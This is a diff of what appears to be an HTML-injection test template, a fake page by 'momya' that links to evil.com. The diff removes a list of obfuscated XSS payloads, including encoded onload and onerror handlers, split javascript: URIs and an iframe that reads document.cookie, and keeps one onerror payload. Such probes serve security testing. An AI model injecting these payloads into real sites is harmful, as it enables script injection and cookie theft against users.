@@ -7,17 +7,8 @@ info:
         <h1>HTML Injection : Fake page For Testing By momya</h1>
         <h1><a href="https://evil.com">click here</a></html>
          <img src="https://www.icegif.com/wp-content/uploads/2022/01/icegif-165.gif" width="500" height="600">
-         <img src=x onerror=alert(0)>
-         <body%20on%0Dload=alert("1")>
-<%0dscript>alert(1)
-<body%%2020on%%0D0Dload=alert("1")>
-<img/src/onerror=alert(1)> 
-%3Cimg%2Fsrc%2Fonerror%3Dalert(1)%3E
-<body%2%0D0on%0%20Dload=alert("1")>
-<body%09on%0Dload=alert("1")>
-<object onerror=javascript:javascript:alert(1)>
-<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:javascript:alert(2);">]]</C><X></xml>
-<iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(document.cookie)&amp;gt;>"> 
+         <img src=x alert(0)>
+         
 
 <image src=1 href=1 onerror="javascript:alert(1)"></image>
          <fieldset><legend>hello:</legend><label for="fname">First name:</label><input type="text"id="fname"name="fname"><br><br><inputtype="submit" value="Submit"></fieldset>
